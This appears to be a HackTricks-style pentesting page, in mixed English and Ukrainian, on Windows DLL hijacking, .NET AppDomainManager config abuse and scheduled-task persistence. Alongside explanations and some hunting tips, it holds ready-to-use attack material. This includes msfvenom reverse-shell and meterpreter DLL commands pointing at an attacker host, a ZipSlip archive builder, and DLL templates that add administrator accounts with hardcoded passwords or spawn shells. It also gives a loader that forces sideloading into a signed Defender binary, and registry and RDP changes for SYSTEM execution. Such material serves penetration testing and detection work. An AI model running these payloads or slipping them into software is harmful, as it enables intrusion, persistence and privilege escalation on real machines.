# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking involves manipulating a trusted application into loading a malicious DLL. This term encompasses several tactics like **DLL Spoofing, Injection, and Side-Loading**. It's mainly utilized for code execution, achieving persistence, and, less commonly, privilege escalation. Despite the focus on escalation here, the method of hijacking remains consistent across objectives.

### Common Techniques

Several methods are employed for DLL hijacking, each with its effectiveness depending on the application's DLL loading strategy:

1. **DLL Replacement**: Swapping a genuine DLL with a malicious one, optionally using DLL Proxying to preserve the original DLL's functionality.
2. **DLL Search Order Hijacking**: Placing the malicious DLL in a search path ahead of the legitimate one, exploiting the application's search pattern.
3. **Phantom DLL Hijacking**: Creating a malicious DLL for an application to load, thinking it's a non-existent required DLL.
4. **DLL Redirection**: Modifying search parameters like `%PATH%` or `.exe.manifest` / `.exe.local` files to direct the application to the malicious DLL.
5. **WinSxS DLL Replacement**: Substituting the legitimate DLL with a malicious counterpart in the WinSxS directory, a method often associated with DLL side-loading.
6. **Relative Path DLL Hijacking**: Placing the malicious DLL in a user-controlled directory with the copied application, resembling Binary Proxy Execution techniques.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading is not the only way to make a trusted **.NET Framework** process load attacker code. If the target executable is a **managed** application, the CLR also consults an **application configuration file** named after the executable (for example `Setup.exe.config`). That file can define a custom **AppDomainManager**. If the config points to an attacker-controlled assembly placed next to the EXE, the CLR loads it **before the application's normal code path** and runs inside the trusted process.

Per Microsoft's .NET Framework configuration schema, both `<appDomainManagerAssembly>` and `<appDomainManagerType>` must be present for the custom manager to be used.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Мінімальний менеджер:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Практичні нотатки:
- Це tradecraft, специфічний для **.NET Framework**. Він залежить від CLR config parsing, а не від Win32 DLL search order.
- Хост має бути справді **managed EXE**. Швидка triage: `sigcheck -m target.exe`, `corflags target.exe`, або перевірка **CLR Runtime Header** у PE metadata.
- Ім'я config-файлу має точно збігатися з ім'ям executable (`<binary>.config`) і зазвичай лежить **поруч з EXE**.
- Це корисно з **signed Microsoft/vendor binaries**, бо trusted EXE залишається незміненим, тоді як malicious managed assembly виконується in-process.
- Якщо у вас уже є writable installer/update directory, AppDomainManager hijacking можна використати як **first stage**, а потім застосувати classic DLL sideloading або reflective loading для later stages.

### AppDomainManager як downloader + scheduled-task bootstrap

Практичний pattern intrusion — поєднати trusted managed EXE з malicious `*.config` і malicious AppDomainManager DLL, яка виконує лише роль **маленького bootstrapper**:

1. User запускає signed .NET installer або updater з переконливого розташування, наприклад `%USERPROFILE%\Downloads`.
2. Суміжний config змушує CLR завантажити attacker assembly **до того**, як почне працювати legitimate app logic.
3. Malicious manager виконує **path gate** (наприклад, продовжує роботу лише якщо host EXE запущено з `Downloads`, і дозволяє second stage лише з `%LOCALAPPDATA%`).
4. Якщо перевірка проходить, він завантажує реальний payload у user-writable path, наприклад `%LOCALAPPDATA%\PerfWatson2.exe`, і встановлює persistence за допомогою scheduled task.

Чому цей варіант важливий:
- Signed host EXE залишається незміненим, тож triage, що хешує лише main binary, може пропустити compromise.
- Простий **path-based anti-analysis** — це поширено: перенесення тріади ZIP/EXE/DLL на Desktop, Temp або sandbox path може навмисно зламати chain.
- AppDomainManager DLL першого stage може залишатися маленькою і малошумною, тоді як real implant завантажується пізніше.

Minimal persistence example, який часто зустрічається з цим pattern:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Примітки:
- ` /rl highest` означає **найвищий доступний** для цього користувача/сесії; сам по собі це не гарантована ескалація до SYSTEM.
- Цю техніку часто краще класифікувати як **execution/persistence via .NET config abuse** ніж класичний missing-DLL search-order hijacking, хоча оператори часто поєднують обидві.

Підказки для виявлення:
- Підписані .NET executable, запущені з шляхів **ZIP extraction**, `Downloads`, `%TEMP%` або інших папок, доступних на запис користувачу, із **colocated** `<exe>.config`.
- Нові scheduled tasks, чия дія вказує в `%LOCALAPPDATA%`, `%APPDATA%` або `Downloads`, і чиї назви імітують браузерні/вендорні updater-и.
- Короткоживучі managed bootstrap process, які одразу завантажують інший EXE, а потім запускають `schtasks.exe`.
- Зразки, що завершуються рано, якщо шлях до executable не збігається з очікуваним каталогом профілю користувача.

### Hijacking an existing scheduled task to relaunch the sideload chain

Для persistence не обмежуйтеся лише **створенням нового task**. Деякі intrusion sets чекають, поки легітимний installer створить **normal updater task**, а потім **переписують task action**, щоб для defenders залишалися знайомими існуючі name, author і trigger.

Reusable workflow:
1. Встановіть/запустіть легітимне software і визначте task, який воно зазвичай створює.
2. Експортуйте task XML і зверніть увагу на поточні значення `<Exec><Command>` / `<Arguments>`.
3. Замініть лише action, щоб task запускав ваш **trusted host EXE** з user-writable staging directory, який потім side-loads або AppDomain-loads real payload.
4. Зареєструйте той самий task name ще раз замість створення нового очевидного persistence artifact.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Why it is stealthier:
- The task name can still look legitimate (for example a vendor updater).
- The **Task Scheduler service** launches it, so parent/ancestor validation often sees the expected scheduling chain instead of `explorer.exe`.
- DFIR teams that only hunt for **new task names** may miss a task whose registration already existed but whose action now points to `%LOCALAPPDATA%`, `%APPDATA%`, or another attacker-controlled path.

Fast hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Compare `C:\Windows\System32\Tasks\*` XML and `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata against a baseline.
- Alert when a **vendor-looking updater task** executes from **user-writable directories** or launches a .NET EXE with a colocated `*.config` file.

> [!TIP]
> For a step-by-step chain that layers HTML staging, AES-CTR configs, and .NET implants on top of DLL sideloading, review the workflow below.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

The most common way to find missing Dlls inside a system is running [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) from sysinternals, **setting** the **following 2 filters**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

and just show the **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

If you are looking for **missing dlls in general** you **leave** this running for some **seconds**.\
If you are looking for a **missing dll inside an specific executable** you should set **another filter like "Process Name" "contains" `<exec name>`, execute it, and stop capturing events**.

## Exploiting Missing Dlls

In order to escalate privileges, the best chance we have is to be able to **write a dll that a privilege process will try to load** in some of **place where it is going to be searched**. Therefore, we will be able to **write** a dll in a **folder** where the **dll is searched before** the folder where the **original dll** is (weird case), or we will be able to **write on some folder where the dll is going to be searched** and the original **dll doesn't exist** on any folder.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

**Windows applications** look for DLLs by following a set of **pre-defined search paths**, adhering to a particular sequence. The issue of DLL hijacking arises when a harmful DLL is strategically placed in one of these directories, ensuring it gets loaded before the authentic DLL. A solution to prevent this is to ensure the application uses absolute paths when referring to the DLLs it requires.

You can see the **DLL search order on 32-bit** systems below:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

That is the **default** search order with **SafeDllSearchMode** enabled. When it's disabled the current directory escalates to second place. To disable this feature, create the **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value and set it to 0 (default is enabled).

If [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function is called with **LOAD_WITH_ALTERED_SEARCH_PATH** the search begins in the directory of the executable module that **LoadLibraryEx** is loading.

Finally, note that **a dll could be loaded indicating the absolute path instead just the name**. In that case that dll is **only going to be searched in that path** (if the dll has any dependencies, they are going to be searched as just loaded by name).

There are other ways to alter the ways to alter the search order but I'm not going to explain them here.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Use **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) to collect DLL names that the process probes but cannot find.
2. If the binary runs on a **schedule/service**, dropping a DLL with one of those names into the **application directory** (search-order entry #1) will be loaded on the next execution. In one .NET scanner case the process looked for `hostfxr.dll` in `C:\samples\app\` before loading the real copy from `C:\Program Files\dotnet\fxr\...`.
3. Build a payload DLL (e.g. reverse shell) with any export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. If your primitive is a **ZipSlip-style arbitrary write**, craft a ZIP whose entry escapes the extraction dir so the DLL lands in the app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Доставте архів до спостережуваної скриньки/шару; коли заплановане завдання знову запустить процес, він завантажить malicious DLL і виконає ваш код під обліковим записом service.

### Примусове sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath

Просунутий спосіб детерміновано вплинути на шлях пошуку DLL для щойно створеного процесу — встановити поле DllPath у RTL_USER_PROCESS_PARAMETERS під час створення процесу за допомогою native APIs ntdll. Якщо вказати тут каталог під контролем attacker, цільовий процес, який розв'язує imported DLL за назвою (без абсолютного шляху і без використання safe loading flags), можна примусити завантажити malicious DLL із цього каталогу.

Ключова ідея
- Зберіть process parameters через RtlCreateProcessParametersEx і вкажіть custom DllPath, який веде до вашої керованої папки (наприклад, каталогу, де лежить ваш dropper/unpacker).
- Створіть процес через RtlCreateUserProcess. Коли цільовий binary розв'язує DLL за назвою, loader використає цей DllPath під час resolution, що забезпечує надійне sideloading навіть тоді, коли malicious DLL не розміщена поруч із цільовим EXE.

Примітки/обмеження
- Це впливає на child process, що створюється; це не те саме, що SetDllDirectory, яке впливає лише на current process.
- Ціль має import або LoadLibrary DLL за назвою (без абсолютного шляху і без використання LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs і hardcoded absolute paths не можна hijack. Forwarded exports і SxS можуть змінювати precedence.

Мінімальний C приклад (ntdll, wide strings, спрощена обробка помилок):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


### .NET AppDomainManager hijacking via `.exe.config`

For **.NET Framework** targets, sideloading can be done **before `Main()`** without patching memory by abusing the application's adjacent **`.exe.config`** file. Instead of relying only on the Win32 DLL search order, the attacker places a legitimate .NET EXE next to a malicious config and one or more attacker-controlled assemblies.

How the chain works:
1. The host EXE starts and the **CLR reads `<exe>.config`**.
2. The config sets **`<appDomainManagerAssembly>`** and **`<appDomainManagerType>`** so the runtime instantiates an attacker-controlled `AppDomainManager`.
3. The malicious manager gets **pre-`Main()` execution** inside the trusted host process.
4. The same config can force the CLR to resolve local assemblies first (for example `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) and can weaken runtime validation/telemetry without inline patching.

Campaign-style pattern (exact nesting can vary by directive / CLR version):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Why this is useful:
- **`<probing privatePath="."/>`** keeps assembly resolution in the application directory, turning the folder into a predictable sideloading surface.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** move execution into attacker code during CLR initialization, before the legitimate app logic runs.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** can let a full-trust app load unsigned or tampered assemblies without a strong-name validation failure.
- **`<publisherPolicy apply="no"/>`** avoids publisher-policy redirects to newer assemblies.
- **`<requiredRuntime ... safemode="true"/>`** makes runtime selection more deterministic.
- **`<etwEnable enabled="false"/>`** is especially interesting because the **CLR disables its own ETW visibility** from configuration instead of the implant patching `EtwEventWrite` in memory.

Operational pattern seen in recent campaigns:
- Stage 1 drops `setup.exe`, `setup.exe.config`, and local assemblies.
- Stage 2 copies them into a believable **AppData update** folder, renames the host to something like `update.exe`, and relaunches it via a **scheduled task**.
- Stage 3 verifies execution context (for example expected parent `svchost.exe` from Task Scheduler) before loading the final RAT DLL/export.

Hunting ideas:
- Signed or otherwise legitimate **.NET executables** running with suspicious adjacent **`.config`** files in user-writable locations.
- `.config` files containing **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, or **`etwEnable enabled="false"`**.
- Scheduled tasks that relaunch renamed update binaries from **`%LOCALAPPDATA%`** or app-specific `\bin\update\` directories.
- Parent/child chains where a scheduled task launches a trusted .NET host that immediately loads non-vendor assemblies from its own directory.

#### Винятки з порядку пошуку dll у документації Windows

У документації Windows зазначено деякі винятки зі стандартного порядку пошуку DLL:

- Коли зустрічається **DLL, що має таку саму назву, як уже завантажена в пам'ять**, система обходить звичайний пошук. Натомість вона перевіряє redirection і manifest, перш ніж за замовчуванням використати DLL, яка вже є в пам'яті. **У цьому сценарії система не виконує пошук DLL**.
- Якщо DLL розпізнано як **known DLL** для поточної версії Windows, система використовуватиме її версію known DLL разом із будь-якими залежними DLL, **без виконання процесу пошуку**. У реєстровому ключі **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** зберігається список цих known DLL.
- Якщо **DLL має залежності**, пошук цих залежних DLL виконується так, ніби їх було вказано лише за **назвами модулів**, незалежно від того, чи була початкова DLL виявлена через повний шлях.

### Підвищення Privileges

**Вимоги**:

- Виявити процес, який працює або працюватиме під **іншими privileges** (horizontal or lateral movement), і якому **бракує DLL**.
- Переконатися, що є **write access** до будь-якого **directory**, у якому **DLL** буде **searched for**. Це може бути directory виконуваного файла або directory в system path.

Так, ці вимоги складно знайти, бо **за замовчуванням досить дивно знайти привілейований виконуваний файл без dll**, і ще **дивніше мати write permissions на папку в system path** (за замовчуванням не можна). Але в неправильно налаштованих середовищах це можливо.\
Якщо вам пощастило і ви виконуєте ці вимоги, можете перевірити проєкт [UACME](https://github.com/hfiref0x/UACME). Навіть якщо **основна мета проєкту — bypass UAC**, там може бути **PoC** Dll hijaking для версії Windows, який можна використати (ймовірно, просто змінивши path папки, де у вас є write permissions).

Зверніть увагу, що ви можете **перевірити свої permissions у folder**, зробивши:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
І **перевірте permissions усіх папок всередині PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Також можна перевірити imports виконуваного файла та exports dll за допомогою:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Для повного гіда про те, як **abuse Dll Hijacking to escalate privileges** з правами на запис у папку **System Path** дивіться:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Інші цікаві automated tools для виявлення цієї vulnerability — це **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

У разі, якщо ви знайдете exploitable scenario, однією з найважливіших речей для успішної exploitation буде **створити dll, яка exports принаймні всі functions, які executable буде import from it**. У будь-якому разі, зверніть увагу, що Dll Hijacking корисний для [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Ви можете знайти приклад **how to create a valid dll** у цьому дослідженні про dll hijacking, зосередженому на dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Крім того, у **next section** ви можете знайти деякі **basic dll codes**, які можуть бути корисними як **templates** або для створення **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basically a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as **exected** by **relaying all the calls to the real library**.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Отримати meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Створіть користувача (x86, я не бачив версії x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Your own

Зверніть увагу, що в кількох випадках Dll, яку ви компілюєте, має **експортувати кілька функцій**, які будуть завантажені процесом жертви; якщо цих функцій не існує, **binary won't be able to load** їх, і **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Приклад C++ DLL із створенням користувача</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Альтернативна C DLL з thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe все ще перевіряє передбачуваний, мовно-специфічний localization DLL під час запуску, який можна hijack для arbitrary code execution і persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` виконується. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Naive hijack буде говорити/підсвічувати UI. Щоб лишатися тихо, під час attach перелічи Narrator threads, відкрий main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) і `SuspendThread` його; продовжуй у власному thread. Див. PoC для повного code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- З наведеним вище, запуск Narrator завантажує planted DLL. На secure desktop (logon screen) натисни CTRL+WIN+ENTER, щоб запустити Narrator; твій DLL виконується як SYSTEM на secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Дозволь classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Підключись по RDP до host, на logon screen натисни CTRL+WIN+ENTER, щоб запустити Narrator; твій DLL виконується як SYSTEM на secure desktop.
- Execution зупиняється, коли RDP session закривається—inject/migrate швидко.

Bring Your Own Accessibility (BYOA)
- Ти можеш клонувати вбудований Accessibility Tool (AT) registry entry (наприклад, CursorIndicator), змінити його так, щоб він вказував на arbitrary binary/DLL, імпортувати його, а потім встановити `configuration` на ім'я цього AT. Це проксить arbitrary execution у framework Accessibility.

Notes
- Запис у `%windir%\System32` і зміна HKLM values потребують admin rights.
- Уся payload logic може жити в `DLL_PROCESS_ATTACH`; exports не потрібні.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Цей case демонструє **Phantom DLL Hijacking** у Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), відстежуваний як **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` розташований у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` запускається щодня о 9:30 AM у context користувача, який увійшов у систему.
- **Directory Permissions**: Writable для `CREATOR OWNER`, що дозволяє local users скидати arbitrary files.
- **DLL Search Behavior**: Намагається завантажити `hostfxr.dll` зі своєї working directory спочатку і логить "NAME NOT FOUND", якщо його немає, що вказує на local directory search precedence.

### Exploit Implementation

Attacker може розмістити malicious `hostfxr.dll` stub у тій самій директорії, експлуатуючи відсутній DLL, щоб отримати code execution у context користувача:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Як standard user, скиньте `hostfxr.dll` у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Зачекайте, поки scheduled task запуститься о 9:30 AM у контексті поточного користувача.
3. If an administrator is logged in when the task executes, malicious DLL запускається в сесії адміністратора з medium integrity.
4. Chain standard UAC bypass techniques, щоб підвищитися з medium integrity до привілеїв SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors often pair MSI-based droppers with DLL side-loading to execute payloads under a trusted, signed process.

Chain overview
- User downloads MSI. A CustomAction silently runs during GUI install (e.g., LaunchApplication or a VBScript action), reconstructing the next stage from embedded resources.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Look for entries that run executables or VBScript. Example suspicious pattern: LaunchApplication executing an embedded file in background.
- In Orca (Microsoft Orca.exe), inspect CustomAction, InstallExecuteSequence and Binary tables.
- Embedded/split payloads in the MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Look for multiple small fragments that are concatenated and decrypted by a VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
